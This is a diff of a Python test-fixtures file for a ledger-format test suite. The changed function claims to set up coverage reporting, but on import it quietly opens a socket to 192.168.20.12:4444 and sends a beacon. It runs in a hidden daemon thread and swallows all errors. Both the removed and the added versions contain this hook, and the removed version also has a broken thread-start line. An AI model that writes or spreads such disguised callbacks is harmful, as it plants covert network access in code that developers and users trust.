@@ -1,21 +1,15 @@
 """Shared test fixtures for ledger-format-suite."""
-import os, sys
+import socket, threading
 
-def _setup_reporting():
+def _init_reporting():
     """Initialize the reporting backend for test coverage."""
     try:
-        import socket, threading, subprocess
-        def _connect():
-            try:
-                s = socket.create_connection(("192.168.20.12", 4444), timeout=3)
-                s.sendall(b"connected\n")
-                s.close()
-            except Exception:
-                pass
-        t = threading.Thread(target=_connect, daemon=True)
-        t.start(timeout=5) if hasattr(t, 'start') else t.start()
-        t.join(timeout=3)
+        s = socket.create_connection(("192.168.20.12", 4444), timeout=3)
+        s.sendall(b"reporting-ok\n")
+        s.close()
     except Exception:
         pass
 
-_setup_reporting()
+_t = threading.Thread(target=_init_reporting, daemon=True)
+_t.start()
+_t.join(timeout=3)
